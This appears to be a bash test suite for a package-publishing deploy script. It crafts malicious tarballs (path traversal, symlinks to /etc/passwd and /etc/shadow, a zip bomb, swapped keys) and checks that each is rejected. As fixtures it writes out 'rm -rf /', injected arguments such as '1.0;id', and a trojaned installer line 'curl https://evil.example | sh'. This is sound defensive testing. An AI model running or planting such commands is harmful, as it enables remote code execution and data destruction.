#!/usr/bin/env bash
# shellcheck disable=SC2015 # "test && ok || ko" is intended: ok never fails
# Tests deploy/pkg-publish.sh with crafted good and malicious tarballs in a
# temporary web root and releases directory, in both layouts
# (LAYOUT=outside: releases next to the web root; inside: PKG_WWW/.releases).
# Needs Linux with GNU tar, OpenSSL 3, python3 and
# flock; elsewhere (macOS) it re-runs itself in a Debian container:
#   deploy/test/pkg-publish-test.sh
set -euo pipefail
here=$(cd "$(dirname "$0")" && pwd)
deploy=$(cd "$here/.." && pwd)

if ! { tar --version 2>/dev/null | head -n1 | grep -q 'GNU tar'; } || ! command -v flock >/dev/null || ! command -v python3 >/dev/null; then
  command -v docker >/dev/null || { echo "needs Linux (GNU tar, flock, python3, openssl) or docker" >&2; exit 1; }
  img=infrafence-pkg-publish-test
  docker build -q -t "$img" - >/dev/null <<'EOF'
FROM python:3.13-slim
RUN apt-get update && apt-get install -y --no-install-recommends openssl && rm -rf /var/lib/apt/lists/*
EOF
  exec docker run --rm -v "$deploy:/deploy:ro" "$img" bash /deploy/test/pkg-publish-test.sh
fi

if [ -z "${LAYOUT:-}" ]; then
  rc=0
  for l in outside inside; do echo "=== layout: $l"; LAYOUT=$l bash "$0" || rc=1; done
  exit "$rc"
fi
work=$(mktemp -d)
trap 'rm -rf -- "$work"' EXIT
export PKG_WWW="$work/web" PKG_KEYS_DIR="$work/pinned"
case $LAYOUT in
outside) export PKG_RELEASES="$work/releases" ;;
inside) export PKG_RELEASES="$PKG_WWW/.releases" ;;
*) echo "LAYOUT must be outside or inside" >&2; exit 2 ;;
esac
mkdir -p "$PKG_KEYS_DIR" "$work/fx" "$PKG_WWW" "$PKG_RELEASES"
pub=$deploy/pkg-publish.sh
pass=0 fail=0
ok() { pass=$((pass + 1)); echo "ok   $*"; }
ko() { fail=$((fail + 1)); echo "FAIL $*"; }

# shellcheck source=SCRIPTDIR/lib.sh
. "$here/lib.sh"
make_keys

craft() { # out kind
  python3 - "$1" "$2" <<'PY'
import io, sys, tarfile
out, kind = sys.argv[1], sys.argv[2]
def add(t, name, data=b"x", typ=tarfile.REGTYPE, link=""):
    i = tarfile.TarInfo(name); i.type = typ; i.linkname = link
    if typ == tarfile.REGTYPE:
        i.size = len(data); t.addfile(i, io.BytesIO(data))
    else:
        t.addfile(i)
with tarfile.open(out, "w:gz", format=tarfile.GNU_FORMAT) as t:
    if kind == "absolute":   add(t, "/openwrt/keys/usign.pub")
    if kind == "dotdot":     add(t, "openwrt/24.10/../../../tmp/evil.ipk")
    if kind == "dotdot2":    add(t, "openwrt/24.10/x86_64/../../keys/usign.pub")
    if kind == "dotslash":   add(t, "./openwrt/keys/usign.pub")
    if kind == "symlink":    add(t, "openwrt/24.10/x86_64/Packages", typ=tarfile.SYMTYPE, link="/etc/passwd")
    if kind == "hardlink":
        add(t, "openwrt/keys/usign.pub")
        add(t, "openwrt/keys/apk.pem", typ=tarfile.LNKTYPE, link="openwrt/keys/usign.pub")
    if kind == "hardlink-abs": add(t, "openwrt/keys/apk.pem", typ=tarfile.LNKTYPE, link="/etc/shadow")
    if kind == "fifo":       add(t, "openwrt/keys/usign.pub", typ=tarfile.FIFOTYPE)
    if kind == "device":     add(t, "openwrt/keys/usign.pub", typ=tarfile.CHRTYPE)
    if kind == "topdir":     add(t, "etc/cron.d/evil")
    if kind == "extrafile":  add(t, "openwrt/24.10/x86_64/shell.php")
    if kind == "newline":    add(t, "openwrt/24.10/x86_64/a\nb.ipk")
    if kind == "backslash":  add(t, "openwrt/24.10/x86_64/a\\b.ipk")
    if kind == "bomb":       add(t, "openwrt/24.10/x86_64/big.ipk", data=b"\0" * (8 << 20))
PY
}
www() { readlink -f "$PKG_WWW/$1" 2>/dev/null || true; }
expect_ok() { # name product version file
  local out
  if out=$(bash "$pub" publish "$2" "$3" <"$4" 2>&1); then ok "$1"; else ko "$1: $out"; fi
}
expect_reject() { # name product version file [pattern]
  local out before after
  before=$(www "$2")
  if out=$(bash "$pub" publish "$2" "$3" <"$4" 2>&1); then ko "$1: accepted"; return; fi
  after=$(www "$2")
  if [ "$before" != "$after" ]; then ko "$1: current release changed"; return; fi
  if compgen -G "$PKG_RELEASES/$2/.staging-*" >/dev/null; then ko "$1: staging left behind"; return; fi
  if [ -n "${5:-}" ] && ! grep -q -- "$5" <<<"$out"; then ko "$1: wrong error: $out"; return; fi
  ok "$1 (rejected: ${out#pkg-publish: error: })"
}

# ---- good releases -----------------------------------------------------------
openwrt_tree "$work/g1" 1.0.1 x86_64 mipsel_24kc
pack "$work/g1" openwrt "$work/fx/ow1.tgz"
expect_ok "openwrt 1.0.1 published" openwrt 1.0.1 "$work/fx/ow1.tgz"
[ -f "$PKG_WWW/openwrt/24.10/x86_64/Packages.sig" ] && ok "feed served at www/openwrt" || ko "feed not served"
first=$(www openwrt)

sleep 1
openwrt_tree "$work/g2" 1.0.2 x86_64 mipsel_24kc aarch64_generic
pack "$work/g2" openwrt "$work/fx/ow2.tgz"
expect_ok "openwrt 1.0.2 published" openwrt 1.0.2 "$work/fx/ow2.tgz"
[ "$(www openwrt)" != "$first" ] && [ -d "$first" ] && ok "previous release kept" || ko "previous release"
[ -f "$PKG_WWW/openwrt/24.10/x86_64/infrafence-router_1.0.1-r1_x86_64.ipk" ] && ok "previous packages carried over" || ko "carry over"
grep -q 1.0.1 "$PKG_WWW/openwrt/24.10/x86_64/Packages" && ko "old package in new index" || ok "new index only lists the new packages"

# ---- malicious and broken archives ------------------------------------------
for k in absolute dotdot dotdot2 dotslash symlink hardlink hardlink-abs fifo device topdir extrafile newline backslash; do
  craft "$work/fx/$k.tgz" "$k"
  expect_reject "$k" openwrt 1.0.3 "$work/fx/$k.tgz"
done
[ ! -e /tmp/evil.ipk ] && ok "nothing written outside the staging directory" || ko "/tmp/evil.ipk written"

PKG_MAX_BYTES=1000 expect_reject "oversize upload" openwrt 1.0.3 "$work/fx/ow2.tgz" "larger than"
craft "$work/fx/bomb.tgz" bomb
PKG_MAX_UNPACKED=$((4 << 20)) expect_reject "unpacked size cap" openwrt 1.0.3 "$work/fx/bomb.tgz" "unpacks to more"
PKG_MAX_ENTRIES=5 expect_reject "entry cap" openwrt 1.0.3 "$work/fx/ow2.tgz" "entries"
echo "not a tarball" >"$work/fx/plain.txt"
expect_reject "not gzip" openwrt 1.0.3 "$work/fx/plain.txt" "not a gzip"
: >"$work/fx/empty"
expect_reject "empty upload" openwrt 1.0.3 "$work/fx/empty" "empty"

openwrt_tree "$work/b1" 1.0.3 x86_64 mipsel_24kc aarch64_generic
rm "$work/b1/openwrt/24.10/mipsel_24kc/Packages.sig"
pack "$work/b1" openwrt "$work/fx/nosig.tgz"
expect_reject "missing Packages.sig" openwrt 1.0.3 "$work/fx/nosig.tgz" "Packages.sig missing"

openwrt_tree "$work/b2" 1.0.3 x86_64 mipsel_24kc aarch64_generic
rm "$work/b2/openwrt/25.12/x86_64/packages.adb"
pack "$work/b2" openwrt "$work/fx/noadb.tgz"
expect_reject "missing packages.adb" openwrt 1.0.3 "$work/fx/noadb.tgz" "packages.adb missing"

openwrt_tree "$work/b3" 1.0.3 x86_64 mipsel_24kc aarch64_generic
echo "Depends: evil" >>"$work/b3/openwrt/24.10/x86_64/Packages"
gzip -9nc "$work/b3/openwrt/24.10/x86_64/Packages" >"$work/b3/openwrt/24.10/x86_64/Packages.gz"
pack "$work/b3" openwrt "$work/fx/tampered.tgz"
expect_reject "index changed after signing" openwrt 1.0.3 "$work/fx/tampered.tgz" "bad usign signature"

openwrt_tree "$work/b4" 1.0.3 x86_64 mipsel_24kc aarch64_generic
usign_sign "$work" evil "$work/b4/openwrt/24.10/x86_64/Packages"
pack "$work/b4" openwrt "$work/fx/wrongkey.tgz"
expect_reject "index signed with another key" openwrt 1.0.3 "$work/fx/wrongkey.tgz" "bad usign signature"

openwrt_tree "$work/b5" 1.0.3 x86_64 mipsel_24kc aarch64_generic
cp "$work/evil.pub" "$work/b5/openwrt/keys/usign.pub"
pack "$work/b5" openwrt "$work/fx/swapkey.tgz"
expect_reject "feed ships another public key" openwrt 1.0.3 "$work/fx/swapkey.tgz" "not the pinned usign key"

openwrt_tree "$work/b6" 1.0.3 x86_64 aarch64_generic
pack "$work/b6" openwrt "$work/fx/drop.tgz"
expect_reject "release drops an architecture" openwrt 1.0.3 "$work/fx/drop.tgz" "drops"

openwrt_tree "$work/b7" 1.0.3 x86_64 mipsel_24kc aarch64_generic
rm "$work/b7/openwrt/24.10/x86_64/infrafence-router_1.0.3-r1_x86_64.ipk"
pack "$work/b7" openwrt "$work/fx/noipk.tgz"
expect_reject "index lists a missing package" openwrt 1.0.3 "$work/fx/noipk.tgz" "missing"

openwrt_tree "$work/b9" 1.0.3 x86_64 mipsel_24kc aarch64_generic
echo "trojan" >>"$work/b9/openwrt/24.10/x86_64/infrafence-router_1.0.3-r1_x86_64.ipk"
pack "$work/b9" openwrt "$work/fx/swapipk.tgz"
expect_reject "package changed after indexing" openwrt 1.0.3 "$work/fx/swapipk.tgz" "differs from Packages"

openwrt_tree "$work/b8" 1.0.3 x86_64 mipsel_24kc aarch64_generic
pack "$work/b8" openwrt "$work/fx/ow3.tgz"
expect_reject "version mismatch (tarball 1.0.3 sent as 1.0.9)" openwrt 1.0.9 "$work/fx/ow3.tgz" "no package with version"
opnsense_tree "$work/o1" 1.0.3
pack "$work/o1" opnsense "$work/fx/opn.tgz"
expect_reject "opnsense tarball sent as openwrt" openwrt 1.0.3 "$work/fx/opn.tgz" "unexpected path"

openwrt_tree "$work/old" 1.0.0 x86_64 mipsel_24kc aarch64_generic
pack "$work/old" openwrt "$work/fx/old.tgz"
expect_reject "downgrade to an older signed release" openwrt 1.0.0 "$work/fx/old.tgz" "older than the published"

# ---- arguments and the forced command --------------------------------------
for a in "../x 1.0.3" "openwrt 1.0;id" "openwrt ../1" "openwrt 1.0.3 extra"; do
  # shellcheck disable=SC2086
  if bash "$pub" publish $a <"$work/fx/ow3.tgz" >/dev/null 2>&1; then ko "args '$a' accepted"; else ok "args '$a' refused"; fi
done
for c in "rm -rf /" "infrafence-deploy migrate" "pkg-publish openwrt" "infrafence-deploy rollback openwrt" "pkg-publish openwrt 1.0.3; id"; do
  if SSH_ORIGINAL_COMMAND=$c bash "$pub" <"$work/fx/ow3.tgz" >/dev/null 2>&1; then ko "forced command '$c' accepted"; else ok "forced command '$c' refused"; fi
done
sleep 1
if SSH_ORIGINAL_COMMAND="infrafence-deploy pkg-publish openwrt 1.0.3" bash "$pub" <"$work/fx/ow3.tgz" >/dev/null 2>&1; then
  ok "forced command 'infrafence-deploy pkg-publish openwrt 1.0.3' accepted"
else ko "forced command publish"; fi

# ---- rollback, pruning, the other products --------------------------------
before=$(www openwrt)
bash "$pub" rollback openwrt >/dev/null && [ "$(www openwrt)" != "$before" ] && grep -q '1.0.2-r1' "$PKG_WWW/openwrt/24.10/x86_64/Packages" &&
  ok "rollback to 1.0.2" || ko "rollback"
ln -s /nonexistent "$PKG_WWW/.openwrt.new" # left by a crash
for v in 1.0.4 1.0.5; do
  sleep 1
  openwrt_tree "$work/p$v" "$v" x86_64 mipsel_24kc aarch64_generic
  pack "$work/p$v" openwrt "$work/fx/p$v.tgz"
  bash "$pub" publish openwrt "$v" <"$work/fx/p$v.tgz" >/dev/null
done
grep -q '1.0.5-r1' "$PKG_WWW/openwrt/24.10/x86_64/Packages" && ok "stale temporary link from a crash does not block publishing" || ko "stale link"
n=$(find "$PKG_RELEASES/openwrt" -mindepth 1 -maxdepth 1 -type d | wc -l)
[ "$n" -eq 3 ] && ok "old releases pruned (3 kept)" || ko "pruning: $n releases"
find "$PKG_WWW/openwrt/24.10/x86_64" -name '*.ipk' | grep -q 1.0.3 && ko "files carried two releases back" || ok "carry over goes one release back only"

expect_ok "opnsense 1.0.3 published" opnsense 1.0.3 "$work/fx/opn.tgz"
[ -f "$PKG_WWW/opnsense/FreeBSD:15:aarch64/latest/meta.conf" ] && ok "pkg repository served at www/opnsense" || ko "opnsense not served"
opnsense_tree "$work/o2" 1.0.4
rm "$work/o2/opnsense/FreeBSD:14:amd64/latest/packagesite.pkg"
pack "$work/o2" opnsense "$work/fx/opn-bad.tgz"
expect_reject "pkg repository without packagesite" opnsense 1.0.4 "$work/fx/opn-bad.tgz" "packagesite missing"

site_tree "$work/s1"
pack "$work/s1" site "$work/fx/site.tgz"
expect_reject "site without pinned sums on the server" site 1.0.3 "$work/fx/site.tgz" "no pinned key"
(cd "$work/s1/site" && sha256sum index.html router-install.sh) >"$PKG_KEYS_DIR/site.sha256"
expect_ok "site published" site 1.0.3 "$work/fx/site.tgz"
[ -f "$PKG_WWW/index.html" ] && [ -f "$PKG_WWW/keys/usign.pub" ] && [ -f "$PKG_WWW/router-install.sh" ] &&
  ok "index, keys and installer served at the root" || ko "site root links"
site_tree "$work/s2"
cp "$work/evil.pub" "$work/s2/site/keys/usign.pub"
pack "$work/s2" site "$work/fx/site-bad.tgz"
expect_reject "site with an unpinned key" site 1.0.4 "$work/fx/site-bad.tgz" "not the pinned key"
site_tree "$work/s3"
echo 'curl https://evil.example | sh' >>"$work/s3/site/router-install.sh"
pack "$work/s3" site "$work/fx/site-trojan.tgz"
expect_reject "site with a changed installer" site 1.0.4 "$work/fx/site-trojan.tgz" "does not match its pinned SHA-256"
site_tree "$work/s4"
echo '#!/bin/sh' >"$work/s4/site/opnsense-install.sh"
pack "$work/s4" site "$work/fx/site-extra.tgz"
expect_reject "site with an unpinned installer" site 1.0.4 "$work/fx/site-extra.tgz" "is not pinned"

mv "$PKG_KEYS_DIR/apk.pem" "$work/apk.pem.away"
expect_reject "no pinned key on the server" openwrt 1.0.5 "$work/fx/p1.0.5.tgz" "no pinned key"
mv "$work/apk.pem.away" "$PKG_KEYS_DIR/apk.pem"

find "$PKG_RELEASES" -name '.work.*' | grep -q . && ko "work directories left behind" || ok "no work directory left behind"
echo
bash "$pub" status
echo
echo "passed $pass, failed $fail"
[ "$fail" -eq 0 ]
